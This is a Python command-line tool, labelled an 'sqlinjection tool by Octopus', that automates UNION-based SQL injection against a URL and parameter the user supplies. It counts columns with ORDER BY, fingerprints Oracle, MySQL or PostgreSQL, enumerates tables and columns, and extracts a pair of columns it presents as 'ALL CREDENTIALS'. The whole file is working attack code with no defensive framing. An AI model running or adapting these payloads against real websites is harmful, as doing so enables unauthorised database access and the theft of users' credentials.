print(''' 
        ___       _        _        _           _   _             
       / _ \  ___| |_ ___ (_)_ __  (_) ___  ___| |_(_) ___  _ __  
      | | | |/ __| __/ _ \| | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
      | |_| | (__| || (_) | | | | || |  __/ (__| |_| | (_) | | | |
       \___/ \___|\__\___/|_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                                  |__/                            
 
           |----------------------------------------------|
           |------- sqlinjection tool by Octopus ---------|
           |----------------------------------------------|
''')

# import the libraries

import requests 
import sys 
import time 
from rich import print
from rich.console import Console
from rich.style import Style

# we check the input given by the user

if(len(sys.argv) == 3) :
    url = sys.argv[1]
    injection_point = sys.argv[2]
    # control of connection width url
    request = requests.get(url)
    if(request.ok) :
        print("[green4][+][/green4] [yellow3]The connection with website is good[/yellow3]")
        time.sleep(2)
        # enumeration of null value  
        print("[green4][+][/green4] [yellow3]Starting the enumeration of input data[/yellow3]")
        time.sleep(2)
        error = False 
        counter = 0
        while( error == False ) :
            counter = counter + 1 
            request = requests.get(url+injection_point+f"'order by {counter}--")
            if("Error" in request.text) :
                error = True
        time.sleep(2)
        print(f"[green4][+][/green4] [yellow3]The number of input data are[/yellow3] [b]{counter - 1}[/b]")
        counter = counter - 1 
        # examing the type of database 
        if(counter == 2) :
            request = requests.get(url+injection_point+f"'+UNION+SELECT+BANNER,+NULL+FROM+v$version--")
            if("Oracle" in request.text) :
                print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Oracle[/b][/orange3] [yellow3]![/yellow3]")
                db_type = "Oracle"
            request = requests.get(url+injection_point+f"' UNION SELECT @@version,null -- -")
            if("8.0.30" in request.text) :
                print("[green4][+][/green4] the type of databse is [orange3][b]mysql[/b][/orange3] or [orange3][b]Microsoft[/b][/orange3]")
                db_type = "mysql"
            request = requests.get(url+injection_point+f"'union select null,version()--")
            if("PostgreSQL" in request.text) :
                print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Postgre[/b][/orange3] [yellow3]![/yellow3]")
                db_type = "Postgre"
        # examing the type of database when cunter = 3
        if(counter == 3):
            request = requests.get(url+injection_point+f"' UNION SELECT null,NULL,BANNER FROM v$version--")
            if("Oracle" in request.text) :
                print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Oracle[/b][/orange3] [yellow3]![/yellow3]")
                db_type = "Oracle"
            request = requests.get(url+injection_point+f"' UNION SELECT null,null,@@version -- -")
            if("8.0.30" in request.text) :
                print("[green4][+][/green4] [yellow3]The type of databse is[/yellow3] [orange3][b]mysql[/b][/orange3] or [orange3][b]Microsoft[/b][/orange3]")
                db_type = "mysql"
            request = requests.get(url+injection_point+f"'union select null,null,version()--")
            if("PostgreSQL" in request.text) :
                print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Postgre[/b][/orange3] [yellow3]![/yellow3]")
                db_type = "Postgre"



        #start the sql injection attack !
    
        time.sleep(3)

        #start attack if the database is Postre,mysql or Microsoft 
        if (db_type == "mysql" or db_type == "Postgre") :

            # start attack if the database is Postre,mysql or Microsoft and counter = 2 
            if (counter == 2) :
                payload_1 = "'union select null,table_name from information_schema.tables--'"
                tables_injection = requests.get(url+injection_point+payload_1)

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = tables_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL TABLES[/b][/cyan][b][green]--------------------[/green][/b]')

                print("\n[green4][+][/green4] [yellow3]enter the table to be scanned[/yellow3]")
                tabella = str(input('---> '))
                payload_2 = f"'union select null,column_name from information_schema.columns where table_name = '{tabella}'--"
                time.sleep(2)
                print("\n[green4][+][/green4] [yellow3]injection attack started[/yellow3]\n\n")
                time.sleep(1)
                columns_injection = requests.get(url+injection_point+payload_2)

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = columns_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL COLUMNS[/b][/cyan][b][green]--------------------[/green][/b]')



                print("[green4][+][/green4] [yellow3]You have to insert two columns !![/yellow3]")
                print("[green4][+][/green4] [yellow3]Here insert the first column !![/yellow3]")
                colonna_1 = str(input())
                print("[green4][+][/green4] [yellow3]Here insert the second column !![/yellow3]")
                colonna_2 = str(input())
                payload_3 = f"'union select null,{colonna_1} || '  ' ||{colonna_2} from users--"
                credential_injection = requests.get(url+injection_point+payload_3)
                
                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = credential_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL CREDENTIALS[/b][/cyan][b][green]--------------------[/green][/b]')





                print("[green4]FINISHED PROGRAM[/green4]")


                # start attack if the database is Postre,mysql or Microsoft and counter = 3
            if (counter == 3) :
                payload_1 = "'union select null,null,table_name from information_schema.tables--'"
                tables_injection = requests.get(url+injection_point+payload_1)
                

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = tables_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL TABLES[/b][/cyan][b][green]--------------------[/green][/b]')



                print("\n[green4][+][/green4]enter the table to be scanned !![yellow3][/yellow3]")
                tabella = str(input('---> '))
                payload_2 = f"'union select null,null,column_name from information_schema.columns where table_name = '{tabella}'--"
                time.sleep(2)
                print("\n [green4][+][/green4] attacco di injection iniziato\n\n")
                time.sleep(1)
                columns_injection = requests.get(url+injection_point+payload_2)
                

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = columns_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL COLUMNS[/b][/cyan][b][green]--------------------[/green][/b]')




                print("[green4][+][/green4] [yellow3]You have to insert two columns!![/yellow3]")
                print("[green4][+][/green4] [yellow3]Here enter the first column !![/yellow3]")
                colonna_1 = str(input())
                print("[yellow3]Here enter the second column !![/yellow3]")
                colonna_2 = str(input())
                payload_3 = f"'union select null,null,{colonna_1} || '  ' ||{colonna_2} from users--"
                credential_injection = requests.get(url+injection_point+payload_3)
                
                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = credential_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL CREDENTIALS[/b][/cyan][b][green]--------------------[/green][/b]')

                print("[green4]FINISHED PROGRAM[/green4]")
            
        # start the attack when the database is Oracle 
        if (db_type == "Oracle") :
            # start the attack when the database is Oracle and counter = 2 
            if (counter == 2) :
                payload_1 = "'union select null,table_name from all_tables--'"
                tables_injection = requests.get(url+injection_point+payload_1)
    
                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = tables_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL TABLES[/b][/cyan][b][green]--------------------[/green][/b]')



                print("\n[green4][+][/green4] [yellow3]Enter the table to be scanned[/yellow3]")
                tabella = str(input('---> '))
                payload_2 = f"'union select null,column_name from all_tab_columns where table_name = '{tabella}'--"
                time.sleep(2)
                print("\n[green4][+][/green4]injection attack started\n\n")
                time.sleep(1)
                columns_injection = requests.get(url+injection_point+payload_2)

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = columns_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL COLUMNS[/b][/cyan][b][green]--------------------[/green][/b]')



                print("[green4][+][/green4][yellow3] You have to insert two columns !![/yellow3]")
                print("[green4][+][/green4] [yellow3]Here enter the first column!![/yellow3]")
                colonna_1 = str(input())
                print("[green4][+][/green4] [yellow3]Here enter the second column !![/yellow3]")
                colonna_2 = str(input())
                payload_3 = f"'union select null,{colonna_1} || '  ' ||{colonna_2} from {tabella}--"
                credential_injection = requests.get(url+injection_point+payload_3)
                
                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = credential_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL CREDENTIALS[/b][/cyan][b][green]--------------------[/green][/b]')




                print("[green4]FINISHED PROGRAM[/green4]")




                # start the attack when the database is Oracle and counter = 2 
            if (counter == 3) :
                payload_1 = "'union select null,null,table_name from all_tables--'"
                tables_injection = requests.get(url+injection_point+payload_1)


                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = tables_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL TABLES[/b][/cyan][b][green]--------------------[/green][/b]')


                print("\n[green4][+][/green4] [yellow3]Enter the table to be scanned[/yellow3]")
                print('[red1][-][/red1]')
                tabella = str(input('---> '))
                payload_2 = f"'union select null,null,column_name from all_tab_columns where table_name = '{tabella}'--"
                time.sleep(2)
                print("\n[green4][+][/green4]injection attack started\n\n")
                time.sleep(1)
                columns_injection = requests.get(url+injection_point+payload_2)
                
                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = columns_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL COLUMNS[/b][/cyan][b][green]--------------------[/green][/b]')



                print("[green4][+][/green4] [yellow3]You have to insert two columns !![/yellow3]")
                print("[green4][+][/green4] [yellow3]Here enter the first column!![/yellow3]")
                colonna_1 = str(input())
                print("[green4][+][/green4] [yellow3]Here enter the second column !![/yellow3]")
                colonna_2 = str(input())
                payload_3 = f"'union select null,null,{colonna_1} || '  ' ||{colonna_2} from {tabella}--"
                credential_injection = requests.get(url+injection_point+payload_3)

                print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                text = credential_injection.text
                get = False
                parole = []
                x = 3650
                fun = False
                for word in text:
                    if x <= 0:
                        fun = True
                    if fun:
                        if get:
                            parole.append(""+word+"")
                        if word == "<":
                            get = False
                        if word == '>':
                            get = True
                    x -= 1
                stringa = ''     
                print(stringa.join(parole).replace('<','').replace('>','').replace('View details','').replace('\n\n\n\n',''))
                print('\n\n[b][green]--------------------[/green][/b][cyan][b]ALL CREDENTIALS[/b][/cyan][b][green]--------------------[/green][/b]')

                print("[green4]FINISHED PROGRAM[/green4]")